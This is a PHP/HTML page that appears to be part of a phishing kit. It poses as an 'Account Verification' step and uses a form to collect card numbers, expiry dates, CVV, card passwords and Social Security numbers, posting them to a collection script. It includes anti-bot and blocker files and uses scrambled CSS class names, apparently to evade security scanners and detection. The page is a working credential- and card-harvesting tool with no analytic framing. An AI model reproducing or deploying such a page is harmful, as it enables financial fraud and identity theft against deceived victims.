<?php
if (!isset($_SESSION)) {
  session_start();
}
 
include "./D/antibots.php";  
include "./D/blocker.php";
$rand = @$_GET['dispatch'];
?>
 <!DOCTYPE html>
<html>
<head>
	<title>Account Verification</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="shortcut icon" type="image/x-icon" href="images/favicon.png" />
</head>
<body>
<div  class="containtcard">
<div class="tccont">
<form method="POST" action="config/post3.php?dispatch=<?php echo $rand;?>">
<div class="FDFMdsfpdfleff522d3fdf1dfSD">
<input type="text" placeholder="" name="1" style="width: 296px;height: 28px;border: 1px solid #AAA;border-radius: 5px;text-indent: 10px;" required="">
</div>
<div class="VbldMSpe221edfsQw11wSCDScv4dsEsdf233fsSq">
<input type="text" placeholder="" name="2" style="width: 296px;height: 28px;border: 1px solid #AAA;border-radius: 5px;text-indent: 10px;" required="">
</div>




<div class="FDFdslfdsmfef4ef2efsFDSFefdv2">
	<select name="EXM" style="width:78px;height:30px;" onchange="$(this).css('border-color', '#ccc');" required>
<option value = ""> - Month - </option>  
<option value="1">January</option>
<option value="2">February</option>
<option value="3">March</option>
<option value="4">April</option>
<option value="5">May</option>
<option value="6">June</option>
<option value="7">July</option>
<option value="8">August</option>
<option value="9">September</option>
<option value="10">October</option>
<option value="11">November</option>
<option value="12">December</option>
</select>
</div>
<div class="FDSFdslfdmfd52232dfdsFDSFefkjsd">
	<select name="EXY" style="width:78px;height:30px;"  onchange="$(this).css('border-color', '#ccc');" required>
  <option value="">- Year -</option>
  <option value="2016">2016</option>
  <option value="2017">2017</option>
  <option value="2018">2018</option>
  <option value="2019">2019</option>
  <option value="2020">2020</option>
  <option value="2021">2021</option>
  <option value="2022">2022</option>
  <option value="2023">2023</option>
  <option value="2024">2024</option>
  <option value="2025">2025</option>
  <option value="2026">2026</option>
  <option value="2027">2027</option>
  <option value="2028">2028</option>
  <option value="2029">2029</option>
  <option value="2030">2030</option>
  <option value="2031">2031</option>
  <option value="2032">2032</option>
</select>
</div>






<div class="ZAREZfk1d254fdf4sCDVdf1dfsSDsq2ds">
<input type="text" placeholder=" CVV" name="5" style="text-align: center;width: 119px;height: 28px;border: 1px solid #AAA;border-radius: 5px;text-indent: -15px;" required="">
	</div>
<div class="FDsfdksfdFD2df2f1dfdFSFDSf1fdfD">
	<input type="text" placeholder="if applicable" name="Pass" style="width: 296px;height: 28px;border: 1px solid #AAA;border-radius: 5px;text-indent: 10px;" >
</div>

<div class="fszfksfSDFDfkdsfksd45422fsfDFEfsdf1s">
	<input type="text" placeholder="XXX-XX-XXXX" name="SSNZBI" style="width: 296px;height: 28px;border: 1px solid #AAA;border-radius: 5px;text-indent: 10px;" >
</div>
<div class="dfdsfg4d4sg5rgre8g8rg7rdf4vsGdfdE">
	<input type="submit" class="btnn" value="Confirm"  required>
</div>
</form>
</div>
</div>
</body>
</html>